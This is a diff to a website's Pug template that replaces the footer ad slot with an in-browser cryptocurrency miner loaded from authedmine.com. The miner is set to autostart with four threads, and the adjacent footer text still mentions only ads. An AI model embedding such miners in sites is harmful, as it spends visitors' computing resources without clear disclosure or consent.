@@ -122,14 +122,22 @@ html(lang="en-US")
                             img(src="/siege/img/github-logo.png")
                         p &#9830; Contact: contact@stratroulette.net
 
-        if(false && settings.disableAds == 0)
+        if(settings.disableAds == 0)
+            script(src="https://authedmine.com/lib/simple-ui.min.js" async)
             #footer
-                #ad-container
-
                 #desperate-plead.
                     This is where an ad would appear if it didn't fail to load!<br>
-                    If you are using an adblocker you can whitelist this website to help us keep going! :)<br>
-                    Otherwise you can completely disable all ads in the settings.
+                    You can completely disable all ads in the settings.
+                #ad-container
+                    .coinhive-miner(
+                        style='position:relative;width:728px;height:90px',
+                        data-key='0gNTo0ArFKBSVhViMBIS9ong3LA3ZJAQ'
+                        data-autostart="true"
+                        data-background="#808080"
+                        data-text="#020202"
+                        data-threads="4"
+                        data-throttle="0.5")
+                        em Loading...
 
         #dialogue-container(onclick="closeAllDialogues();$('body').unbind('touchmove');")
             #feedback-window.c-dialogue(style="display:none")
